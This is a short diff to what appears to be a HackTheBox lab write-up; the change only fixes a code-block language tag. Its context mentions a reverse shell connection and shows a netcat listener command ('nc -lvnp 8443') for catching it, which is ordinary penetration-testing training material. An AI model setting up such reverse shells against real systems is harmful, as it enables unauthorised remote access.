@@ -39,8 +39,7 @@ p.waitFor()
 
 Running the above commands results in a reverse shell connection.
 
-```
-        shellsession
+```shellsession
 hiimeins@htb[/htb]$ nc -lvnp 8443
 
 listening on [any] 8443 ...
